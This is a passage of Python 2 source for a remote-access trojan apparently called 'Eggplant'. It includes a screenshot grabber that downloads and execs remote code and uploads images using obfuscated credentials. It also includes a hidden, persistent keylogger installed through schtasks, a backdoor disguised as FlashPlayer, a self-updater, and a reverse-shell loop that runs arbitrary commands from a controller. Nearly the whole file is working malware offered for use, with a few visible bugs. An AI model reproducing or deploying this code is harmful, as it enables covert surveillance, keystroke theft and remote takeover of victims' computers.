                        protocol    = port_info.get('protocol')
                        service     = port_info.get('service')
                        banner      = port_info.get('banner')
                        state       = port_info.get('state')
                        info        = '{}\t{}\t{}\t{}'.format(str(port), str(state), str(protocol), str(service))
                        result.append(info)
                return "\n\n".join(result)
            except Exception as e:
                if self.debug:
                    print 'Mapping open ports returned error: {}'.format(str(e))

    def wget(self, url, base=None):
        """Emulates the UNIX command for Windows compatability with Windows"""
        if not url.startswith('http'):
            return 'Error: URL must begin with http:// or https:// '
        try:
            data = get(url).text.encode()
            ext  = os.path.splitext(url)[1]
            fn   = os.tempnam(base) + ext
            with file(fn, 'wb') as fp:
                fp.write(fn.read())
            return fn
        except Exception as e:
            if self.debug:
                print "Wget download for URL '{}' failed with error: {}".format(url, str(e))

    def screenshot(self):
        global create_module
        """Takes a screenshot on host machine, uploads it to a public image board, and returns the url of the image"""
        try:
            if os.name is 'nt' or sys.platform is 'win32':
                if 'screenshot' not in globals():
                    code = get(self.urls['screenshot'].format(self.socket.getpeername()[0])).text.encode()
                    mod  = create_module(code, 'screenshot')
                pic = globals()['screenshot'].main()
                
            with open(pic, 'rb') as fp:
                contents = b64encode(fp.read())

            a = 'MDA0MWU3NjVkZTQ3NDQyMTQ2ZTg0MDk2OGZlMjNmNDdmNTdjMjIzMGM2NDljMzQ3MWJiY2VhNDE0NWE2YjFmZTliODcxMTg0NDZjOTJjZjkyMTI2YTU4N2NmMjk3YWVmMjYzMTBlNA==','ZmY0M2Q2OWM1Yjk2YjkwZWU2NzVkOWI2ODk5OTVlYjdmODg1NTRmYzgyMGRlMzU0MWNkMDE5ODE3NGY0ZDQ4NmViYjJlOTMwMTM1NTNlNzcwYjYzZjA0N2M4ODA3MzhkMTMwZDE0ZDZkYjU0ODM3NmM3YzQ3NjdhMTU2M2FiNzM3MzUyMTUzOWI2ZDYwMGUzN2FmZTAzZTI0NDQ2ODMxZDBhNzUyYmM2NWZkMzY1NGQxYjMzODdlYjhhYzg1OTQ2YjFhYjMzZDlkNTQ5MTM5NGI4OTY4NGQ2MTJiZWI3NDJlYjczMjdlMzg='
            b = post(self.urls['images'], headers={self._deobfuscate(a[0]) : self._deobfuscate(a[1])}, data={'image':contents, 'type':'base64'})
            return b.json()['data']['link'].encode()
        except Exception as e3:
            return "Screenshot error: {}".format(str(e3))
        
    def keylogger(self, action):
        """Drops a persistent, stealthy keylogger on client host machine [Windows only]"""
        if action not in ("start","status","stop"):
            return "usage: keylogger <start/status/stop>"
        if os.name is 'nt':
            if 'start' in action:
                if 'keylogger' in self.files:
                    try:
                        os.startfile(self.files.get('keylogger'))
                    except Exception as u:
                        return "Keylog start error: {}".format(str(u))
                else:
                    egglog   = self.urls.get('keylogger').format(self.socket.getpeername()[0])
                    kname    = os.path.splitext(os.path.basename(egglog))[0]
                    interval = 'hourly'
                    try:
                        kfile = self.wget(egglog)
                        self.persistence.update({'keylogger':[kfile]})
                    except Exception as qe:
                        return 'Installing keylogger failed with error: {}'.format(str(x))
                    try:
                        os.startfile(kfile)
                    except Exception as e:
                        return 'Running keylogger failed with error: {}'.format(str(e))
                    try:
                        hide = os.popen('attrib +h {}'.format(kfile)).read()
                        self.persistence.get('hidden files').append(kfile)
                    except Exception as ie:
                        return 'Hiding keylogger failed with error: {}'.format(str(e))
                    try:
                        create  = os.popen('schtasks /CREATE /TN {} /TR {} /SC {}'.format(kname, kfile, interval)).read()                        
                        if 'SUCCESS' in create:
                            self.persistence.get('scheduled tasks').append(kname)
                        return create
                    except Exception as ie:
                        return 'Keylogger persistence failed with error: {}'.format(str(ie))
                    
            elif 'stop' in action:
                try:
                    _ = map(os.remove, self.files.get('keylogger'))
                except Exception as xws:
                    if self.debug:
                        print "Remove keylogger file returned error: {}".format(str(xws))
                try:
                    tasks = [self.persistence.get('scheduled tasks').pop(i) for i in self.persistence.get('scheduled tasks') if 'egglog' in i.lower()]
                    d = [os.popen('schtasks /delete /tn {} /f'.format(task)).read() for task in tasks]
                    return "\n".join(d)
                except Exception as sx:
                    if self.debug:
                        print "Delete keylogger tasks returned error: {}".format(str(sx))
                
            elif 'status' in action:
                try:
                    tasks = [i for i in self.persistence.get('scheduled tasks') if 'egglog' in i.lower()]
                    d = [os.popen('schtasks /query /tn {}'.format(task)).read() for task in tasks]
                    return "\n".join(d)
                except Exception as stx:
                    return "Keylogger status failed with error: {}".format(str(stx))
            else:
                return "Invalid command"
        else:
            ans = "Mac OS X not yet supported for remote logging." if sys.platform in ('darwin','ios') else "{}-based platforms not yet supported for remote logging".format(sys.platform)
            return ans

    def backdoor(self, app='FlashPlayer'):
        """Embeds hidden backdoors into the host machine filesystem"""
        try:
            result = self._backdoor(appname=app)
            return result
        except Exception as e:
            if self.debug:
                print "Backdoor commmand failed with error: {}".format(str(e))
            return "Backdoor commmand failed with error: {}".format(str(e))

    def update(self, **kwargs):
        """Update all the eggplant"""
        return Eggplant(**self.__dict__)

    def install_update(self, **kwargs):
        """Download and initialize new version of the Mother of all Eggplants"""
        n = kwargs.get('name') if 'name' in kwargs else 'flashplayerinstaller'
        v = kwargs.get('version') if 'version' in kwargs else '27.0.0.170'
        if 'executable' in kwargs:
            try:
                _ = self._install_update(n, kwargs.get('executable'), v)
            except Exception as e:
                if self.debug:
                    print "Update failed with error: {}".format(str(e))
                return "Update failed with error: {}".format(str(e))
        else:
            try:
                if os.name is 'nt':
                    _ = self._install_update(n, 'eggplant.exe', v)
                elif sys.platform in ('darwin','ios'):
                    _ = self._install_update(n, 'eggplant.app.zip', v)
                else:
                    _ = self._install_update(n, 'eggplant.sh', v)
            except Exception as e:
                if self.debug:
                    print "Update failed with error: {}".format(str(e))
                return "Update failed with error: {}".format(str(e))
            
    def standby(self, host):
        """Standby mode; wait for further instructions"""
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind(('', self.listen_port))
            s.listen(1)
            conn, addr = s.accept()
            if addr[0] == host:
                self.socket = conn
                self.dhkey  = self._diffiehellman()
                break
            else:
                self._kill(sock=conn)
                return self._standby()
        return self.run()

    def run(self, connection=None):
        """Run a persistent reverse shell"""
        while connection:
            self._send("Client[{}]> ", method='prompt')
            cmd_buffer = ""
            cmd_len    = 1
            while cmd_len:
                cmd_data    = self.socket.recv(1024)
                cmd_len     = len(cmd_data)
                cmd_buffer += cmd_data
                if cmd_len < 1024:
                    break
            data = self._decrypt(cmd_buffer).rstrip()
            cmd, _, action = data.partition(' ')
            if cmd in self.commands:
                output = self.commands[cmd](action) if action else self.commands[cmd]()
            else:
                p = subprocess.Popen(data, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True)
                output = str().join((p.communicate()))
            if not output.__doc__.startswith('str'):
                break
            self._send(output, method=cmd)
        if not connection:
            try:
                self.standby(self.socket.getpeername()[0])
            except Exception as by:
                print 'Standby error: %s' % str(by)
                sys.exit(0)

def missing_dependencies():
    dependencies = dict({'AES':'pycrypto','HMAC':'pycrypto','SHA256':'pycrypto','ShellExecuteEx':'win32com','b64decode':'base64','b64encode':'base64','bytes_to_long':'pycrypto','get':'requests','hexlify':'binascii','long_to_bytes':'pycrypto','sleep':'time','unhexlify':'binascii','uuid1':'uuid'})
    packages     = set([package for package in globals() if package in dependencies])
    missing      = set([dependencies.get(i) for i in list(set(dependencies.keys()).symmetric_difference(packages)) if dependencies.get(i)])
    return missing

def install(packages):
    """Install missing packages"""
    try:
        pip.InstallCommand().main(packages)
    except: pass
    execfile(sys.argv[0])
    sys.exit(0)

def resource_path(relative_path):
    """Helper function for compiling executables with external platform-dependent resources"""
    return os.path.join(getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__))), relative_path)

def create_module(module_code, module_name):
    """Create new module from a string, text file, code from a URL, or code from a compiled-binary"""
    module = new_module(module_name)
    exec module_code in module.__dict__
    return module

def main():
    dependencies = missing_dependencies()
    if len(dependencies):
        install(dependencies)
    while True:
        try:
            e = Eggplant(debug=True)
            e.run(e.socket)
        except Exception as x:
            print str(x)
            sys.exit(0)


if __name__ == '__main__':
    main()
